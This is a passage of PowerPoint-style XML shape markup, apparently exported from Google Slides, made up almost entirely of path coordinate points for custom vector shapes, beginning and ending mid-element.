                  <a:lnTo>
                    <a:pt x="9024" y="11922"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8400" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7006" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="11959"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6823" y="11775"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6749" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6419" y="11629"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6346" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6199" y="11739"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5135" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6163" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6676" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7300" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7483" y="6970"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4769" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4769" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4805" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5172" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="1688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="1835"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4108" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2678" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2274" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1907" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1797" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1504" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="5760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="6420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="734" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="624" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="550" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="404" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="330" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="7007"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="7117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="7447"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="73" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="8034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="660" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="770" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="880" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="990" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1651" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1431" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1211" y="10785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1137" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1174" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1247" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1357" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1467" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1541" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1577" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1614" y="10932"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1687" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1907" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2164" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2494" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2641" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2714" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3338" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3998" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4035" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4145" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4292" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4805" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5282" y="10822"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="11995"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="12105"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="12472"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="12766"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="13169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5612" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5392" y="14196"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5502" y="14343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5722" y="14416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5759" y="14380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="14306"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5832" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5869" y="14086"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5979" y="13793"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6089" y="13463"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6309" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6566" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="12986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6786" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7593" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8253" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8950" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9024" y="12692"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9170" y="12802"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9537" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9647" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9794" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="14050"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="14270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="14233"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="14160"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="13609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="12949"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="12729"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="12215"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="11849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10601" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11371" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11628" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12068" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12288" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12875" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13572" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13682" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12655" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11885" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11738" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="6567"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="6493"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="5980"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11005" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="4916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11591" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="4146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11665" y="3999"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11591" y="3889"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11518" y="3779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11408" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="3705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11151" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10931" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10674" y="2752"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10344" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10124" y="1725"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="1284"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9977" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9904" y="844"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9574" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9427" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9097" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8987" y="661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8840" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7080" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6749" y="918"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6639" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6529" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5942" y="808"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="294"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="1"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5025" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="491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8" name="Google Shape;308;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6789450" y="3384325"/>
              <a:ext cx="262300" cy="186175"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="10492" h="7447" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="7300" y="1761"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7117" y="1797"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="1834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="1907"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="2017"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="2604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="2604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="2274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="2531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="2751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="2898"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7667" y="3338"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7190" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5613" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="6162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="6236"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8547" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="6309"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="5942"/>
                  </a:lnTo>
